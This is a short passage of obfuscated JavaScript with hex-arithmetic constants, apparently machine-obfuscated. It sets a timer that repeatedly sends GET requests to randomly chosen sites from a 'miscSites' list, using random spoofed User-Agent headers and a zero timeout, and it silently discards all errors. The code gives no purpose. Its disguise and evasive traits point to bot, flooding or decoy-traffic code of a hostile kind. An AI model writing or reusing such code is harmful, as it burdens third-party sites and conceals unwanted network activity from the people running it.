  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x111 * -0x1f + -0x1e * -0x6b + 0x1 * 0x2fdd) * getRandomInt(-0xbf1 * -0x1 + 0x19 * -0x8b + -0x1a3 * -0x1, -0x5de * -0x3 + -0x25 * -0x40 + 0x1ad5 * -0x1));
}, -0x2 * 0xec9 + 0x259d + -0x7a7);